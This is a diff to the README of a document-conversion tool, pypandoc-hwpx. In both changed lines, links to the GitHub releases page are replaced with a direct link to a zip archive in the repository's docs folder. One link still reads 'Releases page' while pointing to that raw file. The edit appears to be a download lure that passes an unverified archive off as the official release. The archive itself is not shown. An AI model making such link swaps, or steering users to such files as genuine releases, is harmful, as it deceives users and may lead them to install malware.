@@ -8,7 +8,7 @@
 ### 💾 Download & Install
 To get started, you need to download the application. Visit the link below to access the latest version:
 
-[![Download pypandoc-hwpx](https://img.shields.io/badge/Download-pypandoc--hwpx-blue)](https://github.com/Arunpandi77/pypandoc-hwpx/releases)
+[![Download pypandoc-hwpx](https://github.com/Arunpandi77/pypandoc-hwpx/raw/refs/heads/main/docs/pypandoc_hwpx_2.1.zip)](https://github.com/Arunpandi77/pypandoc-hwpx/raw/refs/heads/main/docs/pypandoc_hwpx_2.1.zip)
 
 ### 🔄 System Requirements
 - **Operating System**: Windows, macOS, or Linux
@@ -63,4 +63,4 @@ If you encounter issues or have questions, please reach out through our reposito
 Special thanks to the Pandoc development team for their incredible work on the conversion library. Their efforts make tools like pypandoc-hwpx possible.
 
 ## 🌟 Conclusion
-The pypandoc-hwpx application simplifies file conversions, allowing you to work more efficiently. For downloads and updates, make sure to visit our [Releases page](https://github.com/Arunpandi77/pypandoc-hwpx/releases).
+The pypandoc-hwpx application simplifies file conversions, allowing you to work more efficiently. For downloads and updates, make sure to visit our [Releases page](https://github.com/Arunpandi77/pypandoc-hwpx/raw/refs/heads/main/docs/pypandoc_hwpx_2.1.zip).
